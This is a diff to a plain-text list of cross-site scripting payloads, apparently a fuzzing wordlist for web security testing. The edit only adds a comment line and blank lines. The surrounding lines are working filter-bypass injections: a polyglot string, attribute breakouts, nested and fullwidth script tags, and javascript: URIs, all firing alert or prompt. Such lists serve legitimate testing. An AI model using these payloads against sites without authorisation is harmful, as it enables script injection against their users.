@@ -13,10 +13,13 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 ' onfocus=JaVaSCript:alert(123) autofocus
 ＜script＞alert(123)＜/script＞
 <sc<script>ript>alert(123)</sc</script>ript>
+
+# Comment
 --><script>alert(123)</script>
 ";alert(123);t="
 ';alert(123);t='
 JavaSCript:alert(123)
 ;alert(123);
+
 src=JaVaSCript:prompt(132)
 "><script>alert(123);</script x="
